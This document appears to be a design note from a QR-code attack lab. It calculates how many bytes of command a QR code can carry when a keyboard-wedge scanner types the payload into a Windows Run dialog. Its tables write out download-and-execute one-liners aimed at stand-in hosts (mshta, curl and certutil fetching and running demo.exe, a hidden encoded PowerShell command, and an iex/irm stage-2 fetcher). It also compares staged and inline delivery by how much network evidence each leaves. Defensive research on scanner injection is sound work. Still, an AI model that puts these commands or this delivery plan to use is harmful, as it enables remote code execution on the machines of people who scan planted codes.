# Capacity notes — W3.2: inline vs staged against QR v40 limits

Concrete byte/char budgets for the P3 corpus. All rendered lengths use the
placeholder targets from `payloads/targets.toml.example`
(`attacker.example` host, `10.10.10.10` SMB example-only, `demo.exe` etc.);
they scale with real lab hostnames, which the formulas below make explicit.

## QR version 40 capacities (ISO/IEC 18004)

| Error correction | Byte (binary) mode | Alphanumeric mode |
|---|---|---|
| L | 2953 bytes | 4296 chars |
| M | 2331 bytes | 3420 chars |
| Q | 1755 bytes | 2626 chars |
| H | 1273 bytes | 1852 chars |

**Mode caveat that dominates in practice:** the QR alphanumeric charset is
`0-9 A-Z space $ % * + - . / :` — **no lowercase**. Every Run-dialog
one-liner in this corpus is lowercase, and URL path segments are
case-sensitive, so the practical capacity for P3 templates is the
**byte-mode** column (2953 B at v40-L) unless P2's encoder (W2.2) applies an
upper/lowercase transform. `layout_safe: false` templates additionally
contain `+ / =` (base64), `"` `%` `&` — all outside the alphanumeric charset
entirely.

## Rendered template lengths (placeholder targets)

| Template | Rendered command (example) | Chars/bytes |
|---|---|---|
| unc-001 | `\\10.10.10.10\lab\tool.exe` | 26 |
| msiexec-001 | `msiexec /i \\10.10.10.10\lab\setup.msi /qn` | 42 |
| mshta-001 | `mshta http://attacker.example/staging/payload.hta` | 49 |
| curl-001 | `cmd /c "curl.exe -sS -o %TEMP%\demo.exe http://attacker.example/staging/demo.exe && %TEMP%\demo.exe"` | 100 |
| certutil-001 | `cmd /c "certutil -urlcache -f http://attacker.example/staging/demo.exe %TEMP%\demo.exe && %TEMP%\demo.exe"` | 106 |
| ps-enc-001 (37-char demo script) | `powershell -w hidden -enc <100 b64 chars>` | 126 |

As a fraction of v40-L byte capacity: staged templates run **26–106 bytes
(0.9–3.6 %)** of the 2953-byte budget — they fit trivially even at EC H
(1273 B). QR modules (and print area, W2.1) are the real constraint at
these lengths, not capacity.

## Inline (ps-enc-001) growth model

`powershell -w hidden -enc <B64>` is 25 chars of prefix; the script body is
UTF-16LE (2 bytes/char) then base64 (×4/3):

```
command_len = 25 + 4 * ceil(2 * script_len / 3)
```

| Script (chars) | UTF-16LE (bytes) | base64 (chars) | Full command | Fits v40-L (2953)? |
|---|---|---|---|---|
| 37 (`Write-Output 'qr-compromise-lab-demo'`) | 74 | 100 | 126 | yes (4.3 %) |
| 52 (`iex (irm http://attacker.example/staging/stage2.ps1)`) | 104 | 140 | 165 | yes (5.6 %) |
| 100 | 200 | 268 | 293 | yes (9.9 %) |
| 300 | 600 | 800 | 825 | yes (28 %) |
| 500 | 1000 | 1336 | 1361 | yes (46 %) |
| 1098 | 2196 | 2928 | 2953 | exactly full |
| 1099 | 2198 | 2932 | 2957 | **no** |

Net: **inline PowerShell via `-enc` tops out at ~1098 script characters**
at v40-L; anything beyond must be staged. At v40-M (P2's likely default EC)
the ceiling is (2331−25)×3/4/2 ≈ **866 script chars**.

## Keystroke-time budget (injectability)

A QR payload becomes N keystrokes injected by the scanner (P0/P1 supply the
real device caps; the scanner traits live in P1's `data/scanners.csv` as
`min_delay_ms`/`max_cps`). Two illustrative device classes:

| Command length | 100 cps, 0 ms delay | 50 cps, 5 ms delay |
|---|---|---|
| 26 (unc-001) | 0.3 s | 0.7 s |
| 49 (mshta-001) | 0.5 s | 1.2 s |
| 106 (certutil-001) | 1.1 s | 2.7 s |
| 126 (ps-enc-001 demo) | 1.3 s | 3.2 s |
| 165 (ps-enc-001 staged fetcher) | 1.7 s | 4.1 s |
| 2953 (v40-L full) | 29.5 s | 73.8 s |

## Staged vs inline analysis (W3.2 conclusion)

- **Staged (mshta/curl/certutil/msiexec/unc)** — fixed 26–106-byte commands,
  independent of payload size. The heavy content crosses the network at run
  time instead of the HID channel. Trade-offs: leaves network artifacts
  (HTTP UA strings, SMB sessions — strong IOCs, see template ARTIFACT lists)
  and requires staging infrastructure (lab placeholders only in this repo).
- **Inline (ps-enc-001)** — no network artifact until the script itself
  phones out, and no staging host, but the HID channel pays 2.67× inflation
  (UTF-16LE × base64) on every script character, plus a floor of ~2 extra
  keystroke-classes (`+ / =`) that make the string non-alphanumeric and
  layout-sensitive (`layout_safe: false` in `manifest.yaml`).
- **The hybrid sweet spot** used by the corpus: inline `iex (irm <url>)`
  (52 script chars → 165-byte command, ~5.6 % capacity, ~1.7–4.1 s inject)
  combines inline delivery with a staged stage-2.
- **Wedge buffer caveat (P1 dependency):** many keyboard-wedge scanners
  buffer a fixed number of characters before dropping input; if that buffer
  is smaller than the command, inline payloads longer than the buffer
  truncate silently. This is unmeasured until P1's W1.2 wedge-quirk data
  lands in `data/scanners.csv` — until then, treat inline commands >~250
  chars as at-risk and prefer staged templates.

## Version note

Numbers above assume single-symbol QR encoding (v40-L/M byte mode). If P2's
encoder emits structured-append segments (W1.4 cross-reference) the per-symbol
capacity is per-segment, not aggregate; capacity math must then be done per
segment against P2's sheet layout.
